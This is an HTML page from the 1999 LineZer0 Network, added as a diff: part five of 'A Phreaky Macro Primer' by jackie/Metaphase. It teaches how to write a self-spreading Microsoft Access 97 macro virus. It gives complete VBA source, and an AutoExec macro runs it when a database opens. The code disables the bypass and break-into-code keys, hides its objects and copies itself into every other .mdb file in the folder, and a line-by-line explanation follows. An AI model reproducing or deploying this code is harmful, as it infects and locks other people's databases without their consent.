@@ -1,0 +1,214 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Access 97</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Access 97 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</b>
+     .Introduction to Access macros & modules
+     .The 'Access' basics
+     .The basic Access macro & module
+
+   [ Music ]
+   
+     .REM .Single collection
+     .Pennywise .Circle of Full
+     .Life of Agony .1989-1999
+     .Me First and the Gimme Gimmes .Have a ball
+
+             
+<b>.Introduction to Access macros & modules</b>
+
+    Welcome to the Access part.  As you  will see,  coding in Access is not
+quite the same as  in other Microsoft applications.  The main difference in
+Access is that  we have both macros and modules.  So now I will explain you
+the difference  between the two in Access.  Ok like as in normal Word,  etc
+macros we store our code in modules  but the normal trigger that we have in
+those for example 'Sub AutoOpen()' is not available in Access.  Well, not a
+real problem for us because instead of this trigger we use macros. Very im-
+portant is just the name of this macro. You may expired it or not so I tell
+you, the name has to be 'AutoExec'. Well, it is not sensitive case so...
+
+    So, basically we need to write a  sub routine for infection in a module
+and call it from a macro. ;) It may sounds a bit confusing but is simple as
+you will see when you try it. Argh...very important thing I forgot,  Access
+does not have any template. ;) Just direct action infection.
+
+
+<b>.The 'Access' basics</b>
+
+    Phew .. you finally reached the basics...well kewl that you are reading
+now this  here.  Let's  start.  First install  the Word help  file for VBA,
+because it will be a good reference for you. It contains a lot of examples.
+If you are not sure about a command, place the cursor on it and press 'F1'.
+This will start the  help for this command.  Ok some of the basic  commands
+are:
+
+        Option Compare Database
+        Option Explicit
+
+    Ok, this two commands are default by Access, so do not change them.
+
+
+	On Error Resume Next
+
+    This  command takes care about  all errors that could  happen while our
+macro is executed.  If an error happens,  VBA will try to  execute the next
+command in our macro. 
+
+
+        DoCmd.SetWarnings (0)
+
+   This command will disable all warnings that access may show on executing
+our virus.
+
+
+        SetOption "Show Hidden Objects", False
+
+    As you will see later, we set the attribute of our modules and macros
+to hidden and we disable this option so that hidden objects will not be di-
+splayed.
+
+
+        CurrentDb.CreateProperty "AllowSpecialKeys", , False
+        CurrentDb.CreateProperty "AllowBreakIntoCode", , False
+        CurrentDb.CreateProperty "AllowBypassKey", , False
+
+    With this commands we disable the possibility that the user breaks into
+our code. Disabling ESC and others.  As always, this commands we need to be
+very unsuspecious. ;)
+
+
+<b>.The basic Access macro & module</b>
+
+    Welcome to the basic Access macro virus lesson.  First of all we need a
+macro with the nice name ' AutoExec ' that executes  the code stored in our
+nice module. The command you will need in the macro is this one.
+
+ RunCode [The name of the sub routine to run]
+
+    Simple, huh, isn't it? Ok, now we have this one, let us see what would
+be the basic code to infect .mdb files (Microsoft Database)
+
+    Things you have to know: The ' AutoExec ' macro would have this command
+inside 'RunCode InfectThisShit()' and the module would be named 'OurModule'
+so that's all for now. ;)
+
+---[ code starts here ]----------------------------------------------------
+
+Function  InfectTheShit()
+On Error Resume Next
+
+CurrentDb.CreateProperty "AllowSpecialKeys", , False
+CurrentDb.CreateProperty "AllowBreakIntoCode", , False
+CurrentDb.CreateProperty "AllowBypassKey", , False
+Application.SetOption "Show Hidden Objects", False
+
+PossibleFile = Dir("*.mdb", vbNormal)
+
+Do While PossibleFile &lt;&gt; ""
+
+ If CurDir & "\" & PossibleFile &lt;&gt; CurrentDb.Name Then
+
+  DoCmd.TransferDatabase acExport, "Microsoft Access", PossibleFile, _
+   acMacro, "AutoExec", "AutoExec"
+  DoCmd.TransferDatabase acExport, "Microsoft Access", PossibleFile, _
+   acModule, "OurModule", "OurModule"
+ End If
+
+PossibleFile = Dir()
+
+Loop
+
+End Function
+
+---[ code ends here ]------------------------------------------------------
+
+    As always, I will walk now through the code step by step. Wasn't that a
+song from NKOTB? (muahahahaha X-D)
+
+---------------------------------------------------------------------------
+Function  InfectTheShit()
+On Error Resume Next
+---------------------------------------------------------------------------
+
+    Here we go, name of the function, important, we just have functions in
+Access, is called 'InfectTheShit'. With the second command we catch all er-
+rors that may happen.
+
+---------------------------------------------------------------------------
+CurrentDb.CreateProperty "AllowSpecialKeys", , False
+CurrentDb.CreateProperty "AllowBreakIntoCode", , False
+CurrentDb.CreateProperty "AllowBypassKey", , False
+Application.SetOption "Show Hidden Objects", False
+---------------------------------------------------------------------------
+
+    Bah,  as I told you above,  this command will disable  all kind of keys
+that the user may can  use to break into our virus execution.  The last one
+turns the Access internal function to show hidden objects off.
+
+---------------------------------------------------------------------------
+PossibleFile = Dir("*.mdb", vbNormal)
+---------------------------------------------------------------------------
+
+    Have you ever tried assembler? Yeah? Then this would remind you on 4eh/
+4fh Find First/Next stuff. ;) Here we store the name of the first matching
+.mdb file into the variable 'PossibleFile'.
+
+---------------------------------------------------------------------------
+Do While PossibleFile &lt;&gt; ""
+---------------------------------------------------------------------------
+
+    If we found a file then do the loop again.
+
+---------------------------------------------------------------------------
+If CurDir & "\" & PossibleFile &lt;&gt; CurrentDb.Name Then
+---------------------------------------------------------------------------
+
+    Here we check if the name of the file we want to infect isn't the file
+that is currently executing our virus.
+
+---------------------------------------------------------------------------
+DoCmd.TransferDatabase acExport, "Microsoft Access", PossibleFile, _
+ acMacro, "AutoExec", "AutoExec"
+DoCmd.TransferDatabase acExport, "Microsoft Access", PossibleFile, _
+ acModule, "OurModule", "OurModule"
+---------------------------------------------------------------------------
+
+    With this one we transfer our virus stuff from one database to another.
+First the macro then the module. You see, easy ;)
+
+---------------------------------------------------------------------------
+PossibleFile = Dir()
+
+Loop
+
+End Function
+---------------------------------------------------------------------------
+
+    After we infected one,  we check for the next matching  file as you can
+see it will be stored  again in our variable ' PossibleFile '.  Now we jump
+back to our  loop that checks if  the file is ok or not.  The last one ends
+the function.
+
+    Hehe, that was a short chapter, wasn't it?  But full of information and
+wisedom, at least ;) Now we put spotlight on MS Project!
+
+                            -End Of Part#5-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
